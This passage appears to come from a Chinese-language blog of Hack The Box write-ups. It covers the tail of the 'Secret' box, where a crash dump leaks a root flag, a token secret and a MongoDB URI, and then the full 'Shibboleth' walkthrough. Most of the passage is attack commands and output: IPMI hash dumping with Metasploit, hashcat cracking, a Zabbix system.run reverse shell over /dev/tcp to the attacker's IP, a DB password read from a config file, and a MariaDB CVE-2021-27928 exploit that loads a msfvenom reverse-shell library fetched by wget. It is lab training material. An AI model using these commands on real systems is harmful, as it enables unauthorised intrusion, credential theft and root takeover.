cd /var/crash\ncd /var/crash\ndasith@secret:/var/crash$ ls -la\nls -la\ntotal 36\ndrwxrwxrwt  2 root   root    4096 Dec  6 07:44 .\ndrwxr-xr-x 14 root   root    4096 Aug 13 05:12 ..\n-rw-r-----  1 dasith dasith 28207 Dec  6 07:44 _opt_count.1000.crash\n```\n这里可以看到已经生成了错误日志了，新建一个我们自己的目录，然后把文件拷贝过去\n\n```Plain Text\ndasith@secret:/var/crash$ mkdir /tmp/lucifiel\nmkdir /tmp/lucifiel\ndasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/lucifiel\napport-unpack _opt_count.1000.crash /tmp/lucifiel\ndasith@secret:/var/crash$ cd /tmp/lucifiel\ncd /tmp/lucifiel\ndasith@secret:/tmp/lucifiel$ ls -la\nls -la\ntotal 436\ndrwxr-xr-x  2 dasith dasith   4096 Dec  6 07:51 .\ndrwxrwxrwt 13 root   root     4096 Dec  6 07:49 ..\n-rw-r--r--  1 dasith dasith      5 Dec  6 07:51 Architecture\n-rw-r--r--  1 dasith dasith 380928 Dec  6 07:51 CoreDump\n-rw-r--r--  1 dasith dasith     24 Dec  6 07:51 Date\n-rw-r--r--  1 dasith dasith     12 Dec  6 07:51 DistroRelease\n-rw-r--r--  1 dasith dasith     10 Dec  6 07:51 ExecutablePath\n-rw-r--r--  1 dasith dasith     10 Dec  6 07:51 ExecutableTimestamp\n-rw-r--r--  1 dasith dasith      5 Dec  6 07:51 ProblemType\n-rw-r--r--  1 dasith dasith     10 Dec  6 07:51 ProcCmdline\n-rw-r--r--  1 dasith dasith      4 Dec  6 07:51 ProcCwd\n-rw-r--r--  1 dasith dasith     53 Dec  6 07:51 ProcEnviron\n-rw-r--r--  1 dasith dasith   2144 Dec  6 07:51 ProcMaps\n-rw-r--r--  1 dasith dasith   1336 Dec  6 07:51 ProcStatus\n-rw-r--r--  1 dasith dasith      1 Dec  6 07:51 Signal\n-rw-r--r--  1 dasith dasith     29 Dec  6 07:51 Uname\n-rw-r--r--  1 dasith dasith      3 Dec  6 07:51 UserGroups\n```\n我们可以看到有一个CoreDump文件，我们将其以字符串形式输出\n\n```Plain Text\ndasith@secret:/tmp/lucifiel$ strings CoreDump\nstrings CoreDump\nCORE\nCORE\ncount\n./count -p\nIGISCORE\nCORE\nELIFCORE\n/opt/count\n/opt/count\n/opt/count\n/opt/count\n/opt/count\n/usr/lib/x86_64-linux-gnu/libc-2.31.so\n/usr/lib/x86_64-linux-gnu/libc-2.31.so\n/usr/lib/x86_64-linux-gnu/libc-2.31.so\n/usr/lib/x86_64-linux-gnu/libc-2.31.so\n/usr/lib/x86_64-linux-gnu/libc-2.31.so\n/usr/lib/x86_64-linux-gnu/libc-2.31.so\n/usr/lib/x86_64-linux-gnu/ld-2.31.so\n/usr/lib/x86_64-linux-gnu/ld-2.31.so\n/usr/lib/x86_64-linux-gnu/ld-2.31.so\n/usr/lib/x86_64-linux-gnu/ld-2.31.so\n/usr/lib/x86_64-linux-gnu/ld-2.31.so\nCORE\n////////////////\nPath:\nCould\nLINUX\n////////////////\nPath:\nCould\nTUUU\n/lib64/ld-linux-x86-64.so.2\nlibc.so.6\nsetuid\nexit\nreaddir\nfopen\nclosedir\n__isoc99_scanf\nstrncpy\n__stack_chk_fail\nputchar\nfgetc\nstrlen\nprctl\ngetchar\nfputs\nfclose\nopendir\ngetuid\nstrncat\n__cxa_finalize\n__libc_start_main\nsnprintf\n__xstat\n__lxstat\nGLIBC_2.7\nGLIBC_2.4\nGLIBC_2.2.5\n_ITM_deregisterTMCloneTable\n__gmon_start__\n_ITM_registerTMCloneTable\nUnable to open directory.\n??????????\nTotal entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\nUnable to open file.\nPlease check if file exists and you have read privilege.\nTotal characters = %d\nTotal words      = %d\nTotal lines      = %d\nEnter source file/directory name:\n%99s\nSave results a file? [y/N]:\nPath:\nCould not open %s for writing\n:*3$\"\nPath: esults a file? [y/N]: words      = 2\nTotal lines      = 2\noot/root.txt\n1bf72c039cbd58751b38c6916602f537\naliases\nethers\ngroup\ngshadow\nhosts\ninitgroups\nnetgroup\nnetworks\npasswd\nprotocols\npublickey\nservices\nshadow\nCAk[S\nlibc.so.6\n/lib/x86_64-linux-gnu\nlibc.so.6\nuTi7J\n|F:m\n_rtld_global\n__get_cpu_features\n_dl_find_dso_for_object\n_dl_make_stack_executable\n_dl_exception_create\n__libc_stack_end\n_dl_catch_exception\nmalloc\n_dl_deallocate_tls\n_dl_signal_exception\n__tunable_get_val\n__libc_enable_secure\n__tls_get_addr\n_dl_get_tls_static_info\ncalloc\n_dl_exception_free\n_dl_debug_state\n_dl_argv\n_dl_allocate_tls_init\n_rtld_global_ro\nrealloc\n_dl_rtld_di_serinfo\n_dl_mcount\n_dl_allocate_tls\n_dl_signal_error\n_dl_exception_create_format\n_r_debug\n_dl_catch_error\nld-linux-x86-64.so.2\nGLIBC_2.2.5\nGLIBC_2.3\nGLIBC_2.4\nGLIBC_PRIVATE\nsse2\nx86_64\navx512_1\ni586\ni686\nhaswell\nxeon_phi\nlinux-vdso.so.1\ntls/haswell/avx512_1/x86_64/tls/haswell/x86_64/tls/avx512_1/x86_64/tls/x86_64/\n/lib/x86_64-linux-gnu/libc.so.6\n%%%%%%%%%%%%%%%%\n////////////////\nory name:\n%99s\n/root/root.txt\nTotal characters = 33\nTotal words      = 2\nTotal lines      = 2\ncI,b\nx86_64\n./count\nSHELL=/bin/sh\nversioning=[object Object]\nunstable_restarts=0\ntreekill=true\nenv=[object Object]\nfilter_env=\nnamespace=default\nrestart_time=0\nDB_CONNECT=mongodb://127.0.0.1:27017/auth-web\naxm_options=[object Object]\nvizion_running=false\nPWD=/opt\nLOGNAME=dasith\nPM2_USAGE=CLI\nexec_interpreter=node\nPM2_HOME=/home/dasith/.pm2\nHOME=/home/dasith\nNODE_APP_INSTANCE=0\nLANG=en_US.UTF-8\nLS_COLORS=\npm_id=0\nversion=1.0.0\npm_uptime=1638771355228\nkm_link=false\npm_cwd=/home/dasith/local-web\naxm_monitor=[object Object]\ninstance_var=NODE_APP_INSTANCE\npmx=true\nunique_id=340d74ce-a3fa-4484-a533-bfcb827fe92c\nLESSCLOSE=/usr/bin/lesspipe %s %s\nvizion=true\nusername=dasith\nLESSOPEN=| /usr/bin/lesspipe %s\nwatch=false\nwindowsHide=true\nautomation=true\naxm_actions=\nSHLVL=1\nTOKEN_SECRET=gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE\nPM2_INTERACTOR_PROCESSING=true\ncreated_at=1633619800035\nmerge_logs=true\npm_pid_path=/home/dasith/.pm2/pids/index-0.pid\nPATH=/usr/bin:/bin\npm_err_log_path=/home/dasith/.pm2/logs/index-error.log\nnode_version=10.19.0\nkill_retry_time=100\nautorestart=true\naxm_dynamic=[object Object]\nnode_args=\nexec_mode=fork_mode\npm_exec_path=/home/dasith/local-web/index.js\nOLDPWD=/\nstatus=launching\nname=index\npm_out_log_path=/home/dasith/.pm2/logs/index-out.log\n_=./count\n./count\nbemX\n__vdso_gettimeofday\n__vdso_time\n__vdso_clock_gettime\n__vdso_clock_getres\n__vdso_getcpu\nlinux-vdso.so.1\nLINUX_2.6\nLinux\nLinux\nAUATS\nA\\A]]\n[A\\M\nA]]I\n[A\\]\n[A\\]\nGCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0\n.shstrtab\n.gnu.hash\n.dynsym\n.dynstr\n.gnu.version\n.gnu.version_d\n.dynamic\n.note\n.eh_frame_hdr\n.eh_frame\n.text\n.altinstructions\n.altinstr_replacement\n.comment\n```\n```Plain Text\noot/root.txt\n1bf72c039cbd58751b38c6916602f537\n```\n从中获取到了root权限的flag文件","tags":["Hackthebox"]},{"title":"Shibboleth - Hackthebox","url":"/2021/12/03/Hackthebox/Medium/Hackthebox-Shibboleth/","content":"\n# Hackthebox - Shibboleth\n## 靶场信息\n![](Hackthebox-Shibboleth/a48fa360-1812-49a7-95db-5f89bc794258.png)\n\n## 靶场类型\n![](Hackthebox-Shibboleth/53473ca2-3a2f-4ff2-8397-6e872df5db57.png)\n\n## 信息搜集\n首先使用nmap进行端口扫描\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.124\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 20:39 EST\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in 2.92 seconds\n```\n一台禁ping的主机，加上-Pn参数吧\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -Pn --min-rate 5000 10.10.11.124\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 21:32 EST\nNmap scan report for bogon (10.10.11.124)\nHost is up (0.27s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.41\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Did not follow redirect to http://shibboleth.htb/\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=12/2%OT=80%CT=1%CU=31778%PV=Y%DS=2%DC=T%G=Y%TM=61A981D\nOS:1%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=2%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(\nOS:SP=FC%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=\nOS:M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE\nOS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7\nOS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z\nOS:%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y\nOS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR\nOS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40\nOS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G\nOS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Host: shibboleth.htb\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   272.47 ms bogon (10.10.14.1)\n2   273.08 ms bogon (10.10.11.124)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 33.70 seconds\n```\n发现只有一个80端口，去访问一下\n\n![](Hackthebox-Shibboleth/c230e3fb-d039-4262-9e67-7929a1dc53db.png)\n\n直接访问会被跳转到shibboleth.htb，咱们给他加一个hosts\n\n```bash\necho 10.10.11.124 shibboleth.htb >> /etc/hosts\n```\n![](Hackthebox-Shibboleth/fb942a60-8355-4c44-acdc-34947ab70cd7.png)\n\n再次访问就没问题了，老规矩，扫描一下URL，然后顺便看看网页\n\n```bash\n┌──(root💀kali)-[~]\n└─# ffuf -u \"http://shibboleth.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fc 403\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://shibboleth.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response status: 403\n________________________________________________\n\nassets                  [Status: 301, Size: 317, Words: 20, Lines: 10]\nforms                   [Status: 301, Size: 316, Words: 20, Lines: 10]\n.                       [Status: 200, Size: 59474, Words: 17014, Lines: 1324]\n:: Progress: [43003/43003] :: Job [1/1] :: 123 req/sec :: Duration: [0:05:55] :: Errors: 0 ::\n```\n好像也没什么有用的东西，是不是思路错了？找一下vhost试试\n\n```bash\n┌──(root💀kali)-[~]\n└─# ffuf -u \"http://shibboleth.htb/\" -H \"Host:FUZZ.shibboleth.htb\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://shibboleth.htb/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n :: Header           : Host: FUZZ.shibboleth.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200\n________________________________________________\n\nmonitor                 [Status: 200, Size: 3686, Words: 192, Lines: 30]\nmonitoring              [Status: 200, Size: 3686, Words: 192, Lines: 30]\nzabbix                  [Status: 200, Size: 3686, Words: 192, Lines: 30]\n:: Progress: [4989/4989] :: Job [1/1] :: 95 req/sec :: Duration: [0:00:49] :: Errors: 0 ::\n```\n发现三个vshost，都加入到hosts内吧\n\n```bash\necho 10.10.11.124 monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb >> /etc/hosts\n```\n![](Hackthebox-Shibboleth/f6ab2e53-4ef3-45ad-872c-e5da0546c6ae.png)\n\n三个vhost到的页面都是一样的\n\n![](Hackthebox-Shibboleth/74dbcaa4-e99e-412d-96d3-8adf951ab178.png)\n\n测试了一下默认口令和弱口令，均无法正常进入\n\n扫描一下ZABBIX的UDP端口\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -Pn -sU --min-rate 5000 10.10.11.124\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 21:34 EST\nNmap scan report for bogon (10.10.11.124)\nHost is up (0.25s latency).\nNot shown: 1002 closed ports, 996 open|filtered ports\nPORT    STATE SERVICE  VERSION\n80/tcp  open  http     Apache httpd 2.4.41\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Did not follow redirect to http://shibboleth.htb/\n623/udp open  asf-rmcp\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port623-UDP:V=7.91%I=7%D=12/2%Time=61A98220%P=x86_64-pc-linux-gnu%r(ipm\nSF:i-rmcp,1E,\"\\x06\\0\\xff\\x07\\0\\0\\0\\0\\0\\0\\0\\0\\0\\x10\\x81\\x1cc\\x20\\x008\\0\\x01\nSF:\\x97\\x04\\x03\\0\\0\\0\\0\\t\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=12/2%OT=80%CT=1%CU=19625%PV=Y%DS=2%DC=T%G=Y%TM=61A99CF\nOS:B%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11\nOS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T\nOS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=\nOS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF\nOS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40\nOS:%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Host: shibboleth.htb\n\nTRACEROUTE (using port 110/tcp)\nHOP RTT       ADDRESS\n1   262.39 ms bogon (10.10.14.1)\n2   247.76 ms bogon (10.10.11.124)\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6882.83 seconds\n```\n## 漏洞利用\n去Google一下623端口的服务看看是否有可利用的漏洞\n\nGoogle asf-rmcp exploit\n\n![](Hackthebox-Shibboleth/96cc7ff7-1e03-471c-aee4-4f683f4ab284.png)\n\n还真找到一篇相关文章\n\n> [https://book.hacktricks.xyz/pentesting/623-udp-ipmi](https://book.hacktricks.xyz/pentesting/623-udp-ipmi)\n\n![](Hackthebox-Shibboleth/b017f782-4a06-4387-a524-96560b34c234.png)\n\n这里介绍了msf中ipmi的版本识别的脚本，去尝试一下\n\n```bash\nmsf6 > use auxiliary/scanner/ipmi/ipmi_version\nmsf6 auxiliary(scanner/ipmi/ipmi_version) > show options \n\nModule options (auxiliary/scanner/ipmi/ipmi_version):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   BATCHSIZE  256              yes       The number of hosts to probe in each set\n   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT      623              yes       The target port (UDP)\n   THREADS    10               yes       The number of concurrent threads\n\nmsf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.10.11.124\nrhosts => 10.10.11.124\nmsf6 auxiliary(scanner/ipmi/ipmi_version) > exploit \n\n[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)\n[+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) \n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n确定了版本，然后咱们去找一下是否有利用模块\n\n![](Hackthebox-Shibboleth/52e4bc5d-22b7-4d35-9cce-9d35df90edcc.png)\n\n这里有一个hashdump的脚本，似乎可以导出hash，咱们试试\n\n```bash\nmsf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options \n\nModule options (auxiliary/scanner/ipmi/ipmi_dumphashes):\n\n   Name                 Current Setting                                                    Required  Description\n   ----                 ---------------                                                    --------  -----------\n   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained\n   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format\n   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format\n   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line\n   RHOSTS                                                                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT                623                                                                yes       The target port\n   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)\n   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line\n\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.10.11.124\nrhosts => 10.10.11.124\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > exploit \n\n[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:9c0bae80041f0000c6c1b11a809d97676ccfcd485b132a1cf52ceb6e71fbc12d40f67cde218e697ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:1781a47a5579c8c35f0aef780437cf422d27dcd6\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n成功拿到一个账户的hash，咱们使用hashcat爆破hash\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt\nhashcat (v6.1.1) starting...\n\nOpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n=============================================================================================================================\n* Device #1: pthread-Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz, 1417/1481 MB (512 MB allocatable), 4MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nApplicable optimizers applied:\n* Zero-Byte\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n\nATTENTION! Pure (unoptimized) backend kernels selected.\nUsing pure kernels enables cracking longer passwords but for the price of drastically reduced performance.\nIf you want to switch to optimized backend kernels, append -O to your commandline.\nSee the above message to find out about the exact limits.\n\nWatchdog: Hardware monitoring interface not found on your system.\nWatchdog: Temperature abort trigger disabled.\n\nHost memory required for this attack: 65 MB\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\n9c0bae80041f0000c6c1b11a809d97676ccfcd485b132a1cf52ceb6e71fbc12d40f67cde218e697ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:1781a47a5579c8c35f0aef780437cf422d27dcd6:ilovepumkinpie1\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: IPMI2 RAKP HMAC-SHA1\nHash.Target......: 9c0bae80041f0000c6c1b11a809d97676ccfcd485b132a1cf52...27dcd6\nTime.Started.....: Thu Dec  2 21:26:57 2021 (5 secs)\nTime.Estimated...: Thu Dec  2 21:27:02 2021 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:  1534.7 kH/s (1.19ms) @ Accel:1024 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 7397376/14344385 (51.57%)\nRejected.........: 0/7397376 (0.00%)\nRestore.Point....: 7393280/14344385 (51.54%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: iloverobert!!! -> ilovemymum64.\n\nStarted: Thu Dec  2 21:26:38 2021\nStopped: Thu Dec  2 21:27:03 2021\n```\n成功爆破出hash，确定了账号密码\n\n```bash\nUsername = Administrator\nPassword = ilovepumkinpie1\n```\n拿着账号密码去登录后台试试\n\n![](Hackthebox-Shibboleth/7c2b002b-3439-4583-a917-607d7a7348eb.png)\n\n成功登录后台\n\n![](Hackthebox-Shibboleth/80737e6b-fceb-4baf-b944-3a5c023367ef.png)\n\n![](Hackthebox-Shibboleth/da7ccd22-ad14-469c-9e75-2efd64bde119.png)\n\n经过测试 在Configguration的Hosts里点击Items，然后进去添加新项目的的Key处，也可以Getshell\n\n有两篇Zabbix的相关文章大家可以看一下\n\n> [https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix\\_agent](https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix_agent)\n\n> [https://sbcode.net/zabbix/agent-execute-python/](https://sbcode.net/zabbix/agent-execute-python/)\n\n```bash\nsystem.run[/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.19/4444 0>&1\",nowait]\n```\n这边需要使用system.run来进行执行命令，上面就是我们的exploit\n\n首先使用nc进行一个端口监听\n\n```bash\nnc -nvlp 4444\n```\n然后在网页中的Key处输入我们的Exploit，然后保存就可以了\n\n![](Hackthebox-Shibboleth/56be94fd-4b1c-45b5-8450-fa4e8071b571.png)\n\n然后点击最下面的保存，就可以执行我们的Exploit\n\n```bash\n┌──(root💀kali)-[~]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.19] from (UNKNOWN) [10.10.11.124] 54322\nsh: 0: can't access tty; job control turned off\n$ python3 -c \"import pty;pty.spawn('/bin/bash')\";\nzabbix@shibboleth:/$ whoami&&id\nwhoami&&id\nzabbix\nuid=110(zabbix) gid=118(zabbix) groups=118(zabbix)\n```\n成功获得一个shell\n\n## 权限提升\n### User权限\n```bash\nzabbix@shibboleth:/$ cat /etc/passwd | grep bash\ncat /etc/passwd | grep bash\nroot:x:0:0:root:/root:/bin/bash\nipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash\n```\n首先查看一下有bash权限的账户，有一个ipmi-svc，看来咱们必须得提权到它\n\n我们需要登录到ipmi-svc账户，密码与网站后台密码是一样的\n\n```bash\nzabbix@shibboleth:/etc/zabbix$ su ipmi-svc\nsu ipmi-svc\nPassword: ilovepumkinpie1\n\nipmi-svc@shibboleth:/etc/zabbix$ whoami&&id\nwhoami&&id\nipmi-svc\nuid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)\n```\n```bash\nipmi-svc@shibboleth:/tmp$ cd\ncd\nipmi-svc@shibboleth:~$ ls\nls\nuser.txt\nipmi-svc@shibboleth:~$ cat user.txt\ncat user.txt\nb6611bf946f56dc23bcfc3e77f150204\n```\n成功获得user权限的flag文件\n\n### root权限\n在zabbix服务器下找到数据库配置文件密码\n\n```bash\nipmi-svc@shibboleth:/etc/zabbix$ grep -iR 'password' /etc/zabbix/ 2>/dev/null\ngrep -iR 'password' /etc/zabbix/ 2>/dev/null\n/etc/zabbix/zabbix_server.conf.dpkg-dist:### Option: DBPassword\n/etc/zabbix/zabbix_server.conf.dpkg-dist:#      Database password.\n/etc/zabbix/zabbix_server.conf.dpkg-dist:#      Comment this line if no password is used.\n/etc/zabbix/zabbix_server.conf.dpkg-dist:# DBPassword=\n/etc/zabbix/zabbix_server.conf:### Option: DBPassword\n/etc/zabbix/zabbix_server.conf:#        Database password.\n/etc/zabbix/zabbix_server.conf:#        Comment this line if no password is used.\n/etc/zabbix/zabbix_server.conf:DBPassword=bloooarskybluh\n```\n然后登录mysql服务\n\n```bash\nipmi-svc@shibboleth:/etc/zabbix$ mysql -u zabbix -p -D zabbix\nmysql -u zabbix -p -D zabbix\nEnter password: bloooarskybluh\n\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 2954\nServer version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n```\n将10.3.25-MariaDB该版本拿去Google一下\n\n![](Hackthebox-Shibboleth/fe758a28-0830-4d9b-84e2-296193441a07.png)\n\n> [https://github.com/Al1ex/CVE-2021-27928](https://github.com/Al1ex/CVE-2021-27928)\n\n找到了一个CVE\n\n该Exploit大概分为几步\n\n```bash\nStep 1：\n使用Msf生成一个.so的木马\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.19 LPORT=5555 -f elf-so -o Exploit.so\n\nStep 2：\n使用NC监听一个端口\nNc -nvlp 5555\n\nStep 3：\n将Exploit上传到靶机的/tmp目录下\n本地机器：Python3开始一个Http服务\npython3 -m http.server 80\n\n靶机：下载Exploit并保存到/tmp目录下\ncd /tmp\nwget http://10.10.14.19/Exploit.so\n\nStep 4：\n登录mysql后执行脚本\nSET GLOBAL wsrep_provider=\"/tmp/Exploit.so\";\n```\n```bash\n┌──(root💀kali)-[~]\n└─# nc -nvlp 5555\nlistening on [any] 5555 ...\nconnect to [10.10.14.19] from (UNKNOWN) [10.10.11.124] 38044\npython3 -c \"import pty;pty.spawn('/bin/bash')\";\nroot@shibboleth:/var/lib/mysql# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功获得root权限\n\n```bash\nroot@shibboleth:/var/lib/mysql# cd /root\ncd /root\nroot@shibboleth:/root# ls\nls\nroot.txt  